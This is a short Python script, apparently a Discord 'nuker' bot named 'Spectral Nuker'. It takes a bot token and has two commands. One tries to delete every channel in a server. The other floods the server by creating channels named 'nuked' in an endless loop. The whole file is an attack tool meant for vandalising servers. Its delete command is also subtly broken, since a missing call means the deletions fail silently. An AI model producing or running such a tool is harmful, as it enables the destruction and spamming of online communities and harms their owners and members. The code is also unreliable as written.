import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
import random

from colorama import Style, Back, Fore
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

# title

os.system(f'cls & mode 85,20 & title [Spectral Nuker]')

# definitions

token = input(Fore.WHITE + "[" + Fore.BLUE + ">" + Fore.WHITE + "] " + Fore.BLUE + "Bot Token" + Fore.WHITE + ": ")
prefix =  input(Fore.WHITE + "[" + Fore.BLUE + ">" + Fore.WHITE + "] " + Fore.BLUE + "Prefix" + Fore.WHITE + ": ")
client = commands.Bot(command_prefix=prefix)

# main

@client.event
async def on_connect():
    os.system('cls')
    print(Fore.WHITE + "[" + Fore.BLUE + "..." + Fore.WHITE + "] " + Fore.BLUE + "Connecting")

@client.event
async def on_ready():
    os.system('cls')
    print(f"""
          ███████╗██████╗ ███████╗ ██████╗████████╗██████╗  █████╗ ██╗     
          ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     
          ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝███████║██║     
          ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██╔══██║██║     
          ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║██║  ██║███████╗
          ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
            
                         {Fore.WHITE}[{Fore.BLUE}>{Fore.WHITE}]{Fore.BLUE} Logged in as{Fore.WHITE}: {client.user}

""")

# commands

@client.command(pass_context=True)
async def delete(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete
            print(Fore.WHITE + "[" + Fore.BLUE + "-" + Fore.WHITE + "] " + f"Deleted {channel.name}")
        except:
            pass

@client.command(pass_context=True)
async def create(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for i in range(1):
        await guild.create_text_channel("nuked")
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel("nuked")
                print(Fore.WHITE + "[" + Fore.BLUE + "+" + Fore.WHITE + "] " + "Created Channel")

# run

client.run(token)
